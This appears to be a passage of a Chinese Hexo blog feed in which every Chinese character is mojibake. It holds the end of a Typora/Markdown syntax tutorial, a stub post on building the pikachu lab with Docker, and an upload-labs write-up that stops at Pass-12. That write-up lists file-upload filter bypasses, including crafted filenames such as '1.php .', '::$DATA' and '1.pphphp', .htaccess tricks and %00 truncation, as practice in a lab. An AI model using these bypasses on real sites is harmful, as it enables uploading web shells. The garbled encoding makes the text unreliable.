<h3 id="å…¶ä»–">å…¶ä»–</h3>
<h4 id="å„ç§çº¿">å„ç§çº¿</h4>
<p>ä½ å¯ä»¥åœ¨ä¸€è¡Œä¸­ç”¨ä¸‰ä¸ªä»¥ä¸Šçš„æ˜Ÿå·(*)ã€å‡å·(-)ã€åº•çº¿(_)æ¥å»ºç«‹ä¸€ä¸ªåˆ†éš”çº¿ï¼Œè¡Œå†…ä¸èƒ½æœ‰å…¶ä»–ä¸œè¥¿ã€‚ä½ ä¹Ÿå¯ä»¥åœ¨æ˜Ÿå·æˆ–æ˜¯å‡å·ä¸­é—´æ’å…¥ç©ºæ ¼ã€‚</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">***</span></span><br><span class="line"><span class="string">___</span></span><br></pre></td></tr></table></figure>
<hr>
<hr>
<hr>
<h4 id="åˆ—è¡¨">åˆ—è¡¨</h4>
<ol>
<li class="lvl-3">
<p><strong>æ— åºåˆ—è¡¨</strong></p>
</li>
</ol>
<p>ä½¿ç”¨*ï¼Œ+æˆ–-æ ‡è®°ç¬¦å·åŠ ç©ºæ ¼æ¥è¡¨ç¤ºæ— éœ€åˆ—è¡¨é¡¹ï¼Œç¤ºä¾‹å¦‚ä¸‹</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">*</span> ç¬¬ä¸€é¡¹</span><br><span class="line"><span class="bullet">*</span> ç¬¬äºŒé¡¹</span><br><span class="line"><span class="bullet">+</span> ç¬¬ä¸€é¡¹</span><br><span class="line"><span class="bullet">+</span> ç¬¬äºŒé¡¹</span><br><span class="line"><span class="bullet">-</span> ç¬¬ä¸€é¡¹</span><br><span class="line"><span class="bullet">-</span> ç¬¬äºŒé¡¹</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç¬¬ä¸€é¡¹</p>
</li>
<li class="lvl-2">
<p>ç¬¬äºŒé¡¹</p>
</li>
</ul>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç¬¬ä¸€é¡¹</p>
</li>
<li class="lvl-2">
<p>ç¬¬äºŒé¡¹</p>
</li>
</ul>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç¬¬ä¸€é¡¹</p>
</li>
<li class="lvl-2">
<p>ç¬¬äºŒé¡¹</p>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p><strong>æœ‰åºåˆ—è¡¨</strong></p>
</li>
</ol>
<p>ä½¿ç”¨æ•°å­—åŠ .å†åŠ ç©ºæ ¼æ¥è¡¨ç¤ºæœ‰åºåˆ—è¡¨ï¼Œå…¶ä¸­ï¼Œæ•°å­—å¹¶ä¸é‡è¦ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> ç¬¬ä¸€é¡¹</span><br><span class="line"><span class="bullet">3.</span> ç¬¬äºŒé¡¹</span><br><span class="line"><span class="bullet">10.</span> ç¬¬ä¸‰é¡¹</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>ç¬¬ä¸€é¡¹</p>
</li>
<li class="lvl-3">
<p>ç¬¬äºŒé¡¹</p>
</li>
<li class="lvl-3">
<p>ç¬¬ä¸‰é¡¹</p>
</li>
<li class="lvl-3">
<p><strong>åµŒå¥—åˆ—è¡¨</strong></p>
</li>
</ol>
<p>é¦–å…ˆä½¿ç”¨<code>*</code>ã€<code>+</code>æˆ–<code>-</code>è¿›å…¥åˆ—è¡¨ï¼Œç„¶åå›è½¦æ¢è¡Œï¼Œä¼šå‘ç°ç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆåˆ—è¡¨ç¬¬äºŒé¡¹ï¼Œæ­¤æ—¶æŒ‰ä¸‹<strong>Tab</strong>é”®ï¼Œåˆ—è¡¨ç¬¬äºŒé¡¹å˜ä¸ºç¬¬ä¸€é¡¹çš„å­åˆ—è¡¨ã€‚<strong>æŒ‰å›è½¦é€€å‡ºå½“å‰åˆ—è¡¨</strong>ã€‚å¯ä»¥åœ¨æ— åºåˆ—è¡¨ä¸­åµŒå¥—æœ‰åºåˆ—è¡¨ã€‚</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> 1. ä¸€</span><br><span class="line"><span class="bullet">   1.</span> ä¸€.ä¸€</span><br><span class="line"><span class="bullet">      1.</span> ä¸€.ä¸€.ä¸€</span><br><span class="line"><span class="bullet">      2.</span> ä¸€.ä¸€.äºŒ</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>ä¸€</p>
<ol>
<li class="lvl-6">
<p>ä¸€.ä¸€</p>
<ol>
<li class="lvl-9">ä¸€.ä¸€.ä¸€</li>
<li class="lvl-9">ä¸€.ä¸€.äºŒ</li>
</ol>
</li>
<li class="lvl-6">
<p>ä¸€.äºŒ</p>
<ol>
<li class="lvl-9">ä¸€.äºŒ.ä¸€</li>
<li class="lvl-9">ä¸€.äºŒ.äºŒ</li>
</ol>
</li>
</ol>
</li>
</ol>
<h4 id="åŒºå—">åŒºå—</h4>
<p>å¯ä»¥ä½¿ç”¨<code>&gt;</code>åŠ ç©ºæ ¼æ¥è¡¨ç¤ºåŒºå—ã€‚</p>
<p>å½“æˆ‘ä»¬æƒ³è¦å¼•ç”¨åˆ«äººçš„æ–‡ç« å†…å®¹æˆ–è€…éœ€è¦å¯¹æ–‡å­—è¿›è¡Œå¼ºè°ƒæ—¶ï¼Œå¯ä»¥å°†å…¶æ”¾åœ¨åŒºå—å†…ã€‚</p>
<blockquote>
<p>è¿™æ˜¯åŒºå—</p>
<p>åŒºå—ä¹Ÿå¯ä»¥åµŒå¥—</p>
<blockquote>
<p>â€‹	è¿™æ˜¯äºŒçº§åŒºå—</p>
<blockquote>
<p>è¿™æ˜¯ä¸‰çº§åŒºå—</p>
</blockquote>
</blockquote>
</blockquote>
<h4 id="å›¾ç‰‡">å›¾ç‰‡</h4>
<p><strong>å¼•ç”¨å›¾ç‰‡å’Œé“¾æ¥çš„å”¯ä¸€åŒºåˆ«å°±æ˜¯åœ¨æœ€å‰æ–¹æ·»åŠ ä¸€ä¸ªæ„Ÿå¹å·ã€‚</strong> æ’å…¥å›¾ç‰‡çš„è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[alt å±æ€§æ–‡æœ¬]</span>(å›¾ç‰‡åœ°å€)</span><br><span class="line">!<span class="selector-attr">[alt å±æ€§æ–‡æœ¬]</span>(å›¾ç‰‡åœ°å€ &quot;å¯é€‰æ ‡é¢˜&quot;)</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. !<span class="selector-attr">[ç»å¯¹è·¯å¾„å¼•ç”¨]</span>(/images/<span class="number">002</span><span class="selector-class">.png</span> <span class="string">&quot;ç»å¯¹è·¯å¾„å¼•ç”¨&quot;</span> =<span class="number">200</span>*<span class="number">200</span>)</span><br><span class="line"><span class="number">2</span>. !<span class="selector-attr">[ç›¸å¯¹è·¯å¾„å¼•ç”¨]</span>(ã€Hexoã€‘typoraçŸ¥è¯†æ€»ç»“/<span class="number">001</span><span class="selector-class">.jpg</span> <span class="string">&quot;ç›¸å¯¹è·¯å¾„å¼•ç”¨1&quot;</span>)</span><br><span class="line"><span class="number">3</span>. !<span class="selector-attr">[ç›¸å¯¹è·¯å¾„å¼•ç”¨]</span>(<span class="number">001</span><span class="selector-class">.jpg</span> <span class="string">&quot;ç›¸å¯¹è·¯å¾„å¼•ç”¨2&quot;</span>)</span><br><span class="line"><span class="number">4</span>. !<span class="selector-attr">[ç½‘ç»œå›¾ç‰‡]</span>ï¼ˆhttps:<span class="comment">//www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png &quot;Baidu&quot;)</span></span><br></pre></td></tr></table></figure>
<p>ç”±äºä½¿ç”¨æ’ä»¶markdown-it-imsizeæ§åˆ¶äº†å›¾ç‰‡å¤§å°ï¼Œæ­¤å›¾ç‰‡åœ¨ typora ä¸­æ— æ³•æ˜¾ç¤ºâ†“</p>
<p><img src="/posts/287bb156//002.png" alt="æœ¬åœ°pngå›¾ç‰‡" title="ç»å¯¹è·¯å¾„å¼•ç”¨" width="200" height="200"></p>
<p><img src="/posts/287bb156//001.jpg" alt="ç›¸å¯¹è·¯å¾„å¼•ç”¨" title="ç›¸å¯¹è·¯å¾„å¼•ç”¨1"></p>
<p>ç”±äºä½¿ç”¨äº†post_asset_folderï¼Œæ­¤å›¾ç‰‡åœ¨ typora ä¸­æ— æ³•æ˜¾ç¤ºâ†“</p>
<p><img src="/posts/287bb156//001.jpg" alt="ç›¸å¯¹è·¯å¾„å¼•ç”¨" title="ç›¸å¯¹è·¯å¾„å¼•ç”¨2"></p>
<p><img src="/posts/287bb156//PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png" alt="ç½‘ç»œå›¾ç‰‡" title="Baidu"></p>
<p><font class="notice">æ³¨ï¼šå› ä¸ºæˆ‘çš„ typora ä½¿ç”¨äº†å›¾ç‰‡è‡ªåŠ¨ä¸‹è½½åŠŸèƒ½ï¼Œä¼šå¼ºåˆ¶æ”¹ä¸ºæœ¬åœ°å›¾ç‰‡ï¼Œå› æ­¤æ­¤å¤„å·²ç»è‡ªåŠ¨ä¸‹è½½åˆ°äº†æœ¬åœ°ï¼Œå¹¶ä¸”ä¾ç„¶ä½¿ç”¨çš„æœ¬åœ°å›¾ç‰‡ã€‚</font></p>
<p>åœ¨å®é™…çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œè™½ç„¶ç¬¬ä¸‰ç§æ–¹æ³•æœ€ä¸ºæ–¹ä¾¿ï¼Œä½†æ˜¯ç”±äºç¬¬ä¸‰ç§æ–¹æ³•å›¾ç‰‡ä¸èƒ½åœ¨ typora ä¸­æ˜¾ç¤ºï¼Œå› æ­¤æˆ‘é‡‡ç”¨äº†ç¬¬äºŒç§æ–¹æ³•æ¥ç¼–å†™åšå®¢ã€‚å…¶æ¬¡ç”±äºæˆ‘ä½¿ç”¨äº† hexo æ’ä»¶ abbrlink ï¼Œéœ€è¦åœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­\node_modules\hexo-asset-image\index.jsè¿›è¡Œæ›´æ”¹ã€‚</p>
<h4 id="è¡¨æ ¼">è¡¨æ ¼</h4>
<p>Markdown åˆ¶ä½œè¡¨æ ¼ä½¿ç”¨ <code>|</code> æ¥åˆ†éš”ä¸åŒçš„å•å…ƒæ ¼ï¼Œä½¿ç”¨ <code>-</code> æ¥åˆ†éš”è¡¨å¤´å’Œå…¶ä»–è¡Œã€‚<code>:-</code>è¡¨ç¤ºå·¦å¯¹é½<code>-:</code>è¡¨ç¤ºå³å¯¹é½<code>:-:</code>è¡¨ç¤ºä¸­é—´å¯¹é½ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">å·¦å¯¹é½</span>|<span class="string">å³å¯¹é½</span>|<span class="string">ä¸­é—´å¯¹é½</span>|</span><br><span class="line">|<span class="string">:---</span>|<span class="string">---:</span>|<span class="string">:----:</span>|</span><br><span class="line">|<span class="string">å•å…ƒæ ¼</span>|<span class="string">å•å…ƒæ ¼</span>|<span class="string">å•å…ƒæ ¼</span>|</span><br><span class="line">|<span class="string">å•å…ƒæ ¼</span>|<span class="string">å•å…ƒæ ¼</span>|<span class="string">å•å…ƒæ ¼</span>|</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left">å·¦å¯¹é½</th>
<th style="text-align:right">å³å¯¹é½</th>
<th style="text-align:center">ä¸­é—´å¯¹é½</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">å•å…ƒæ ¼</td>
<td style="text-align:right">å•å…ƒæ ¼</td>
<td style="text-align:center">å•å…ƒæ ¼</td>
</tr>
<tr>
<td style="text-align:left">å•å…ƒæ ¼</td>
<td style="text-align:right">å•å…ƒæ ¼</td>
<td style="text-align:center">å•å…ƒæ ¼</td>
</tr>
</tbody>
</table>
<p>åœ¨Typoraä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¿«æ·é”®<strong>Ctrl+T</strong>æ¥æ’å…¥è¡¨æ ¼ï¼Œå¹¶é€‰æ‹©è¡Œåˆ—ï¼Œå½“é€‰ä¸­è¡¨æ ¼æŸä¸€å•å…ƒæ ¼æ—¶ï¼Œå¯ä»¥åœ¨è¡¨æ ¼å·¦ä¸Šè§’æ‰‹åŠ¨è®¾ç½®å¯¹é½æ–¹å¼ï¼Œå³ä¸Šè§’é€‰æ‹©æ›´å¤šæ“ä½œã€‚</p>
<p><img src="/posts/287bb156//image-20241028100647549.png" alt="image-20241028100647549"></p>
<h4 id="æ•°å­¦å…¬å¼">æ•°å­¦å…¬å¼</h4>
<p>åœ¨Typoraä¸­ï¼Œæœ‰ä¸¤ç§æ–¹æ³•æ’å…¥æ•°å­¦å…¬å¼ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">ç¬¬ä¸€ç§æ–¹æ³•ï¼š<span class="symbol">$</span><span class="number">1</span>+<span class="number">2</span>=<span class="number">3</span><span class="symbol">$</span></span><br><span class="line">ç¬¬äºŒç§æ–¹æ³•ï¼š</span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br><span class="line"><span class="number">1</span>+<span class="number">2</span>=<span class="number">3</span></span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ç§æ–¹æ³•ï¼š$1+2=3$</p>
<p>ç¬¬äºŒç§æ–¹æ³•ï¼š<br>
$$<br>
1+2=3<br>
$$</p>
<h2 id="ä¸‰ã€Typoraä¸HTML">ä¸‰ã€Typoraä¸HTML</h2>
<h3 id="3-1-æ”¹å˜å­—ä½“é¢œè‰²åŠå¤§å°">3.1 æ”¹å˜å­—ä½“é¢œè‰²åŠå¤§å°</h3>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>&lt;font&gt; &lt;/font&gt;</code>æ ‡ç­¾æ¥æ”¹å˜å­—ä½“çš„é¢œè‰²åŠå¤§å°ï¼Œå¦‚ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;font <span class="attribute">size</span>=3 <span class="attribute">color</span>=<span class="string">&quot;red&quot;</span>&gt;å­—ä½“é¢œè‰²ä¸ºçº¢è‰²ï¼Œå¤§å°ä¸º3&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font <span class="attribute">size</span>=4 <span class="attribute">color</span>=<span class="string">&quot;blue&quot;</span>&gt;å­—ä½“é¢œè‰²ä¸ºè“è‰²ï¼Œå¤§å°ä¸º4&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font <span class="attribute">size</span>=6 <span class="attribute">color</span>=<span class="string">&quot;#ffffff&quot;</span>&gt;å­—ä½“é¢œè‰²ä¸ºç´«ç½—å…°ï¼Œå¤§å°ä¸º6&lt;/font&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><font size="3" color="red">å­—ä½“é¢œè‰²ä¸ºçº¢è‰²ï¼Œå¤§å°ä¸º3</font></p>
<p><font size="4" color="blue">å­—ä½“é¢œè‰²ä¸ºè“è‰²ï¼Œå¤§å°ä¸º4</font></p>
<p><font size="6" color="#ffffff">å­—ä½“é¢œè‰²ä¸ºç´«ç½—å…°ï¼Œå¤§å°ä¸º6</font></p>
<h3 id="3-2-æ”¹å˜å¯¹é½æ–¹å¼">3.2 æ”¹å˜å¯¹é½æ–¹å¼</h3>
<p>æˆ‘ä»¬å¯ä»¥æ”¹å˜å­—ä½“çš„å¯¹é½æ–¹å¼ï¼Œç”¨æ ‡ç­¾<code>&lt;p&gt; &lt;/p&gt;</code>åŠ ä¸Šå±æ€§<code>align</code>ï¼Œå¦‚ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;left&quot;</span>&gt;</span>å·¦å¯¹é½<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>ä¸­é—´å¯¹é½<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>å³å¯¹é½<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p align="left">å·¦å¯¹é½</p>
<p align="center">ä¸­é—´å¯¹é½</p>
<p align="right">å³å¯¹é½</p>
<h3 id="3-3-æ’å…¥å¤´åƒ">3.3 æ’å…¥å¤´åƒ</h3>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ ‡ç­¾<code>&lt;img src=url /&gt;</code>æ¥æ’å…¥å›¾ç‰‡ï¼Œå¦‚ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=<span class="string">&quot;./ã€Hexoã€‘typoraçŸ¥è¯†æ€»ç»“/001.jpg&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
<img src="/posts/287bb156//001.jpg">
<p>æˆ‘ä»¬å¯ä»¥æ”¹å˜<code>&lt;img&gt;</code>æ ‡ç­¾çš„å±æ€§ï¼Œæ¥æ”¹å˜å›¾ç‰‡çš„å¤§å°ã€‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;./ã€Hexoã€‘typoraçŸ¥è¯†æ€»ç»“/001.jpg&quot;</span> <span class="attribute">width</span>=100 <span class="attribute">height</span>=100/&gt;</span><br></pre></td></tr></table></figure>
<img src="/posts/287bb156//001.jpg" width="100" height="100/">
<p>ä¹Ÿå¯ä»¥æ”¹å˜å›¾ç‰‡çš„ä½ç½®ï¼Œå¦‚ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;ã€Hexoã€‘typoraçŸ¥è¯†æ€»ç»“/001.jpg&quot;</span> <span class="attribute">width</span>=30 <span class="attribute">height</span>=30 <span class="attribute">style</span>=<span class="string">&quot;float:left&quot;</span>/&gt;å›¾ç‰‡åœ¨å·¦è¾¹</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;ã€Hexoã€‘typoraçŸ¥è¯†æ€»ç»“/001.jpg&quot;</span> <span class="attribute">width</span>=30 <span class="attribute">height</span>=30 <span class="attribute">style</span>=<span class="string">&quot;float:right&quot;</span>/&gt;å›¾ç‰‡åœ¨å³è¾¹</span><br></pre></td></tr></table></figure>
<p><img src="/posts/287bb156//001.jpg" width="30" height="30" style="float:left">å›¾ç‰‡åœ¨å·¦è¾¹<img src="/posts/287bb156//001.jpg" width="30" height="30" style="float:right">å›¾ç‰‡åœ¨å³è¾¹</p>
<h2 id="å››ã€å…¶ä»–ç”¨æ³•">å››ã€å…¶ä»–ç”¨æ³•</h2>
<h3 id="æ–‡ç« æˆªæ–­â€”â€”é˜…è¯»å…¨æ–‡">æ–‡ç« æˆªæ–­â€”â€”é˜…è¯»å…¨æ–‡</h3>
<p>è‹¥ä½ æ˜¯ç”¨çš„æ˜¯NEXTä¸»é¢˜ï¼Œå¯ä»¥åœ¨æ–‡ç« ä¸­ä½¿ç”¨<code>&lt; !--more--&gt;</code> æ‰‹åŠ¨è¿›è¡Œæˆªæ–­è¿™ç§æ–¹æ³•å¯ä»¥æ ¹æ®æ–‡ç« çš„å†…å®¹ï¼Œè‡ªå·±åœ¨åˆé€‚çš„ä½ç½®æ·»åŠ  <code>&lt; !--more--&gt;</code> æ ‡ç­¾ï¼Œä½¿ç”¨çµæ´»ï¼Œä¹Ÿæ˜¯Hexoæ¨èçš„æ–¹æ³•ã€‚</p>
<h3 id="ç›®å½•åŠŸèƒ½">ç›®å½•åŠŸèƒ½</h3>
<p>ä½¿ç”¨hexo-tocå¯ä»¥åœ¨æ–‡ç« å¤´éƒ¨æ·»åŠ ç›®å½•ã€‚ å…¶é…ç½®åœ¨åšå®¢æ ¹ç›®å½•çš„_config.ymlæ–‡ä»¶ä¸­ã€‚ç±»ä¼¼äºæ–‡ç« æˆªæ–­åŠŸèƒ½ï¼Œåœ¨éœ€è¦æ˜¾ç¤ºæ–‡ç« ç›®å½•çš„åœ°æ–¹æ·»åŠ <code>&lt;!--toc--&gt;</code></p>
<p>é¢Â·Â·Â·Â·Â·Â·å› ä¸ºä½¿ç”¨è¿™ä¸ªä»¥åä¾§è¾¹æ¡†çš„ç›®å½•æ— æ³•è·³è½¬ï¼Œå°±åˆå¸è½½äº†ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<p><a href="https://blog.csdn.net/weixin_30745641/article/details/95686757">Hexoä¸­æ·»åŠ emojiè¡¨æƒ…</a></p>
<p><a href="https://www.imczw.com/post/tech/hexo-next-tags-markdown.html"> Hexo-Next å¸¸ç”¨ MD è¯­æ³•åˆé›†</a></p>
<p><a href="https://blog.csdn.net/qq_41261251/article/details/102817673">https://blog.csdn.net/qq_41261251/article/details/102817673</a></p>
<p><a href="https://whatsid.me/2019/08/21/hexo-markdown-syntax/#">https://whatsid.me/2019/08/21/hexo-markdown-syntax/#</a></p>
<p><a href="https://blog.csdn.net/lewky_liu/article/details/82432003">Hexoç³»åˆ—(2) - NexTä¸»é¢˜ç¾åŒ–ä¸åšå®¢åŠŸèƒ½å¢å¼º</a></p>
<p><a href="https://theme-next.iissnan.com/theme-settings.html">ä¸»é¢˜é…ç½® - NexT ä½¿ç”¨æ–‡æ¡£</a></p>
<p><a href="https://blog.csdn.net/qq_32320399/article/details/99823695">Markdownè¿æ¥çš„å†™æ³•</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>åšå®¢å†™ä½œ</category>
      </categories>
      <tags>
        <tag>Typora</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€pikachué¶åœºã€‘dockeræ­å»ºpikachué¶åœº</title>
    <url>/posts/712580ba/</url>
    <content><![CDATA[<p>pikachué¶åœºçš„æ­å»ºå…¶å®æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä½†æ˜¯æˆ‘åœ¨ä½¿ç”¨dockeræ­å»ºpikachué¶åœºçš„æ—¶å€™é‡åˆ°äº†å‡ ä¸ªé—®é¢˜ï¼Œä½¿æˆ‘æœ‰äº†ä¸€äº›æ„Ÿæ‚Ÿï¼Œå› æ­¤ç‰¹æ„å†™ç¯‡åšå®¢è®°å½•ä¸€ä¸‹ã€‚</p>
<span id="more"></span>
<p>å› ä¸ºæˆ‘å·²ç»åœ¨æœåŠ¡å™¨ä¸Šæ­å¥½äº†pikachué¶åœºï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ç”¨CentOS 7åœ¨è™šæ‹Ÿæœºå†å¤ç°ä¸€æ¬¡ã€‚</p>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>ã€upload-labé¶åœºã€‘æ–‡ä»¶ä¸Šä¼ </title>
    <url>/posts/c42c29bc/</url>
    <content><![CDATA[<p>OKï¼Œæ‰“è¿™ä¸ªé¶åœºçš„ç›®çš„é¦–å…ˆæ˜¯å­¦ä¹ å­¦ä¹ ï¼Œå…¶æ¬¡æ˜¯çœ‹çœ‹æˆ‘ç›®å‰çš„èƒ½åŠ›ã€‚é‚£äº›ç®€å•çš„ï¼Œå‡ ä¸‹å°±è¿‡çš„å°±ç›´æ¥çœç•¥å†™äº†ï¼Œåè¾¹èƒ½å­¦åˆ°ä¸œè¥¿çš„å†è¯¦ç»†å†™ä¸€ä¸‹ã€‚</p>
<h2 id="Pass-01">Pass-01</h2>
<p>å¾ˆç®€å•ï¼ŒæŠŠphpæ–‡ä»¶åç¼€æ”¹æˆjpgï¼Œåœ¨burpsuiteå†æ”¹å›æ¥å°±å¯ä»¥äº†ã€‚</p>
<h2 id="Pass-02">Pass-02</h2>
<p>è·Ÿä¸Šé¢˜ä¸€æ ·</p>
<h2 id="Pass-03">Pass-03</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>åç«¯é»‘åå•æœºåˆ¶ï¼Œåˆ«æ”¹å›phpï¼Œæ”¹æˆphp5ã€‚</p>
</li>
<li class="lvl-2">
<p>å¦å¤–éšæœºåŒ–äº†æ–‡ä»¶åç§°ï¼Œè®¿é—®çš„æ—¶å€™æ³¨æ„ã€‚</p>
</li>
<li class="lvl-2">
<p>éš¾åº¦ä¸Šå‡çš„è¿˜æŒºå¿«ï¼Œåç«¯phpä»£ç ä¸æ‰§è¡Œï¼Œ<s>ä¸Šä¼ é…ç½®æ–‡ä»¶</s></p>
</li>
<li class="lvl-2">
<p>åç«¯è‡ªåŠ¨æ·»åŠ éšæœºåŒ–å‰ç¼€ï¼Œä¸Šä¼ é…ç½®æ–‡ä»¶æ˜¯ä¸è¡Œçš„ã€‚</p>
</li>
</ul>
<p>è¿™ä¸€å…³æ€ä¹ˆå›äº‹ï¼Œåè¾¹çš„éƒ½æ¯”è¿™ä¸ªå®¹æ˜“ï¼Œç½‘ä¸Šçš„è·Ÿæˆ‘é‡åˆ°çš„ä¹Ÿä¸ä¸€æ ·ã€‚å…ˆç•™ç€çœ‹çœ‹äº†ã€‚</p>
<h2 id="Pass-04">Pass-04</h2>
<p>è¿™ä¸ªæ˜¯ä¿®æ”¹.htaccessæ–‡ä»¶</p>
<h2 id="Pass-05">Pass-05</h2>
<p>é¢â€¦ä¸Šä¼ åç¼€jpgçš„phpæ–‡ä»¶ï¼Œè®¿é—®ç›´æ¥æ‰§è¡Œphpä»£ç äº†ã€‚åˆ äº†.htaccessæ–‡ä»¶é‡æ¥ã€‚<br>
jpgä¸Šä¼ æˆåŠŸï¼Œphpä¸Šä¼ å¤±è´¥ï¼Œéšä¾¿åç¼€ä¸Šä¼ æˆåŠŸï¼Œå› æ­¤åç«¯é»‘åå•é˜²æŠ¤ã€‚å¤§å°å†™ç»•è¿‡æˆåŠŸç”¨äºæˆ‘dockeré•œåƒçš„ç³»ç»Ÿæ˜¯Linuxæ‰€ä»¥ä¸ä¼šæ‰§è¡Œï¼Œç½‘ä¸Šå¾ˆå¤šwindowsç³»ç»Ÿæ˜¯ç›´æ¥æ‰§è¡Œçš„ã€‚</p>
<h2 id="Pass-06">Pass-06</h2>
<p>é“ç†ä¸€æ ·ï¼Œjpgä¸Šä¼ æˆåŠŸï¼Œphpä¸Šä¼ å¤±è´¥ï¼Œéšä¾¿åç¼€ä¸Šä¼ æˆåŠŸï¼Œå› æ­¤åç«¯é»‘åå•é˜²æŠ¤ã€‚åšäº†ä¸€äº›å°è¯•ï¼Œæœ€å<code>1.php .</code>ä¸Šä¼ æˆåŠŸã€‚Linuxæ— æ³•è®¿é—®</p>
<h2 id="Pass-07">Pass-07</h2>
<p>å”‰åˆæ˜¯é»‘åå•ã€‚ä¸Šä¼ <code>1.php.</code>ç›´æ¥ä¸Šä¼ äº†ã€‚Linuxä¸æ‰§è¡Œ</p>
<h2 id="Pass-08">Pass-08</h2>
<p>åˆæ˜¯é»‘åå•ã€‚<code>::$DATA</code>ç»•è¿‡ï¼Œå› ä¸ºæ˜¯linuxä¾ç„¶ä¸æ‰§è¡Œã€‚</p>
<h2 id="Pass-09">Pass-09</h2>
<p>å“å‘€åˆæ˜¯é»‘åå•ã€‚<code>1.php. .</code>æˆåŠŸç»•è¿‡ï¼Œä½†æ˜¯ç”Ÿæˆ<code>1.php.</code>ï¼ŒLinuxä¸æ‰§è¡Œ</p>
<h2 id="Pass-10">Pass-10</h2>
<p>åˆæ˜¯ã€‚é»‘åå•åˆ é™¤ï¼Œä¸Šä¼ <code>1.pphphp</code>æˆåŠŸç»•è¿‡ï¼Œå¯æ‰§è¡Œ</p>
<h2 id="Pass-11">Pass-11</h2>
<p>ç»ˆäºä¸æ˜¯é»‘åå•äº†ã€‚éšæœºåŒ–æ–‡ä»¶åï¼Œåªèƒ½ä¼ ç¬¦åˆè¦æ±‚çš„åç¼€ã€‚ç½‘ä¸Šè¯´æ˜¯%00æˆªæ–­ã€‚ä½†æ˜¯è¿™é‡Œçš„phpç‰ˆæœ¬å·²ç»æ›´æ–°äº†ï¼Ÿ</p>
<p><img src="/posts/c42c29bc//image-20250514140155533.png" alt="image-20250514140155533"></p>
<p>phpç‰ˆæœ¬è¦å°äº5.3.4ï¼Œ5.3.4åŠä»¥ä¸Šå·²ç»ä¿®å¤è¯¥é—®é¢˜ï¼›å¹¶ä¸”magic_quotes_gpcéœ€è¦ä¸ºOFFçŠ¶</p>
<p><img src="/posts/c42c29bc//image-20250519105248225.png" alt="image-20250519105248225"></p>
<h2 id="Pass-12">Pass-12</h2>
